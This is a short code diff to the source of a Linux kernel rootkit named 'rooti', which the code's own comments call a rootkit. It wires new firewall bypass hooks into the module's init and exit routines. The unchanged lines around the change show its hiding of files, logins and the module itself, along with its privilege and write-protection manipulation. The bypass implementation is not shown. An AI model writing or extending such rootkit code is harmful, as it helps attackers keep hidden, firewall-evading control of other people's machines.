@@ -16,6 +16,7 @@
 #include "capabilities/privilege.h"
 #include "capabilities/tracking.h"
 #include "capabilities/unloading.h"
+#include "capabilities/fw_bypass.h"
 #include "capabilities/hiding/dentry.h"
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
@@ -377,6 +378,9 @@ static int __init rooti_init(void)
     // Re-enable write protection
     rooti_protect_memory();
 
+    // Install firewall bypass hooks
+    rooti_install_fw_bypass_hooks();
+
     // If configured to be hidden by default, hide this rootkit
 #ifndef ROOTI_DEBUG_SHOWME
     ret = rooti_hideme();
@@ -410,6 +414,9 @@ static void __exit rooti_exit(void)
 
     // Re-enable write protection
     rooti_protect_memory();
+
+    // Uninstall firewall bypassing hooks
+    rooti_uninstall_fw_bypass_hooks();
 
     // Release any remaining records
     struct rooti_tracked_fd *record;
